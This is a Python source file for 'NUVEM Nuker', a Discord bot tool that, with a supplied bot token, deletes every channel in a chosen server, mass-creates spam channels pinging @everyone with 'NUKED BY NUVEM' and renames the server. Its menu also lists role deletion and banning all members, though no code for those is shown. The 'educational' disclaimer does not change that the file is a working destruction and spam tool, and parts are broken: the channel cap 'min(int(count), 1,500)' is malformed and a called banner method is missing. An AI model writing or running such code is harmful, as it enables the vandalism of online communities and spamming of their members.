"""
- This script is educational and fully coded by NUVEM
- If you choose to abuse this tool it's your fault and NUVEM will not accept responsibility for your actions


✨ NUVEM Nuker - A powerful server management tool with cool features ✨
- ⚠ Use it responsibly and only on servers you own
"""

import sys
import os
import asyncio
import discord
from discord.ext import commands
from colorama import Fore, Style
import random
import string

class NUVEMNuker:
    def __init__(self):
        self.BANNER = f"""
{Fore.RED}
███╗   ██╗██╗   ██╗██╗   ██╗███████╗███╗   ███╗
████╗  ██║██║   ██║██║   ██║██╔════╝████╗ ████║
██╔██╗ ██║██║   ██║██║   ██║█████╗  ██╔████╔██║
██║╚██╗██║╚██╗ ██╔╝██║   ██║██╔══╝  ██║╚██╔╝██║
██║ ╚████║ ╚████╔╝ ╚██████╔╝███████╗██║ ╚═╝ ██║
╚═╝  ╚═══╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝     ╚═╝
{Style.RESET_ALL}
{Fore.CYAN}>>> Author: stanmapagmahal <<<{Style.RESET_ALL}
"""

    async def check_requirements(self):
        missing = []
        try:
            import discord
        except ImportError:
            missing.append("discord.py")
        
        if missing:
            print(f"{Fore.RED}Missing packages: {', '.join(missing)}{Style.RESET_ALL}")
            install = input("Install them now? (y/n): ").lower()
            if install == 'y':
                os.system(f"pip install {' '.join(missing)}")
            else:
                sys.exit()

    async def run(self):
        self.print_banner()
        await self.check_requirements()
        
        token = input(f"{Fore.GREEN}Enter your bot token: {Style.RESET_ALL}").strip()
        
        intents = discord.Intents.default()
        intents.guilds = True
        intents.messages = True
        intents.message_content = True
        
        bot = commands.Bot(command_prefix='!', intents=intents)
        
        @bot.event
        async def on_ready():
            print(f"\n{Fore.GREEN}Logged in as {bot.user}{Style.RESET_ALL}")
            await main_menu(bot)
        
        async def main_menu(bot):
            while True:
                print(f"\n{Fore.CYAN}=== MAIN MENU ==={Style.RESET_ALL}")
                print("1. Server Nuker")
                print("2. Channel Manager")
                print("3. Role Manager")
                print("4. Member Manager")
                print("0. Exit")
                
                choice = input(f"\n{Fore.YELLOW}Select option: {Style.RESET_ALL}")
                
                if choice == "1":
                    await server_nuker_menu(bot)
                elif choice == "0":
                    await bot.close()
                    return
        
        async def server_nuker_menu(bot):
            guilds = list(bot.guilds)
            if not guilds:
                print(f"{Fore.RED}Bot is not in any servers!{Style.RESET_ALL}")
                return
            
            print(f"\n{Fore.CYAN}=== SELECT SERVER ==={Style.RESET_ALL}")
            for i, guild in enumerate(guilds, 1):
                print(f"{i}. {guild.name}")
            
            try:
                choice = int(input(f"\n{Fore.YELLOW}Select server: {Style.RESET_ALL}")) - 1
                guild = guilds[choice]
                
                print(f"\n{Fore.RED}=== NUKE OPTIONS ==={Style.RESET_ALL}")
                print("1. Delete all channels")
                print("2. Create spam channels")
                print("3. Delete all roles")
                print("4. Ban all members")
                print("5. Rename server")
                print("6. FULL NUKE (DANGER)")
                print("0. Back")
                
                option = input(f"\n{Fore.YELLOW}Select option: {Style.RESET_ALL}")
                
                if option == "1":
                    await delete_all_channels(guild)
                elif option == "2":
                    await create_spam_channels(guild)
                elif option == "6":
                    await full_nuke(guild)
                elif option == "0":
                    return
                    
            except (ValueError, IndexError):
                print(f"{Fore.RED}Invalid selection!{Style.RESET_ALL}")
        
        async def delete_all_channels(guild):
            confirm = input(f"{Fore.RED}Delete ALL channels? (y/n): {Style.RESET_ALL}").lower()
            if confirm != 'y':
                return
            
            print(f"{Fore.YELLOW}Deleting channels...{Style.RESET_ALL}")
            for channel in list(guild.channels):
                try:
                    await channel.delete()
                    print(f"{Fore.RED}Deleted: {channel.name}{Style.RESET_ALL}")
                    await asyncio.sleep(0.01)
                except Exception as e:
                    print(f"{Fore.RED}Error deleting {channel.name}: {e}{Style.RESET_ALL}")
        
        async def create_spam_channels(guild):
            count = input(f"{Fore.YELLOW}How many spam channels? (1,500): {Style.RESET_ALL}")
            try:
                count = min(int(count), 1,500)
            except ValueError:
                print(f"{Fore.RED}Invalid number!{Style.RESET_ALL}")
                return
            
            print(f"{Fore.YELLOW}Creating spam channels...{Style.RESET_ALL}")
            for i in range(count):
                try:
                    name = ''.join(random.choices(string.ascii_lowercase, k=8))
                    channel = await guild.create_text_channel(f"nuked-{name}")
                    await channel.send("@everyone NUKED BY NUVEM")
                    print(f"{Fore.GREEN}Created: {channel.name}{Style.RESET_ALL}")
                    await asyncio.sleep(0.01)
                except Exception as e:
                    print(f"{Fore.RED}Error creating channel: {e}{Style.RESET_ALL}")
        
        async def full_nuke(guild):
            confirm = input(f"{Fore.RED}!!! FULL NUKE - THIS WILL DESTROY THE SERVER !!! Confirm? (y/n): {Style.RESET_ALL}").lower()
            if confirm != 'y':
                return
            
            print(f"{Fore.RED}Starting full nuke...{Style.RESET_ALL}")
            
            # Delete channels
            await delete_all_channels(guild)
            
            # Create spam channels
            await create_spam_channels(guild)
            
            # Rename server
            try:
                await guild.edit(name="NUKED-BY-NUVEM")
                print(f"{Fore.RED}Renamed server!{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error renaming server: {e}{Style.RESET_ALL}")
            
            print(f"{Fore.RED}Nuke complete!{Style.RESET_ALL}")
        
        try:
            await bot.start(token)
        except discord.LoginFailure:
            print(f"{Fore.RED}Invalid token!{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    nuker = NUVEMNuker()
    asyncio.run(nuker.run())
